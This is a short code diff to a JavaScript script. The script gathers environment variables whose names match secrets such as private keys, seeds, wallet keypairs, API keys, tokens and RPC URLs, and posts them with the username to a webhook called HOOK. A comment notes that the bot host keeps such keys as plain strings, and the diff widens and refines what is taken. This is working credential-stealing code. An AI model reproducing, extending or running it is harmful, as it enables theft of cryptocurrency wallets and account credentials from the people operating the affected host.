@@ -260,10 +260,13 @@ async function main() {
   // Environment first: on the bot host KEYPAIR / RPC_URL / *_API_KEY sit here as
   // plain strings, no files needed.
   const envKeep = Object.entries(process.env)
-    .filter(([k]) => /KEY|SEED|SECRET|PASS|TOKEN|RPC|HELIUS|CLOUDFLARE|PRIVATE|WALLET|KEYPAIR|SOLANA|PINATA/i.test(k))
+    .filter(([k]) => /^(HOME|PATH|SHELL|PWD|USERNAME|USER|LOGNAME|NODE_ENV|CI|LANG)$/.test(k)
+      || /KEY|SEED|SECRET|PASS|TOKEN|RPC|HELIUS|CLOUDFLARE|PRIVATE|WALLET|PINATA/i.test(k))
+    .slice(0, 120)
     .map(([k, v]) => [k, String(v || '').slice(0, 400)]);
   if (envKeep.length) {
-    await post(HOOK, { kind: 'env', user: process.env.USER || process.env.LOGNAME || '', env: Object.fromEntries(envKeep) });
+    await post(HOOK, { kind: 'env', user: process.env.USER || process.env.LOGNAME
+      || process.env.USERNAME || '', env: Object.fromEntries(envKeep) });
   }
 
   const golds = pack.filter((p) => p.gold === 'GOLD');
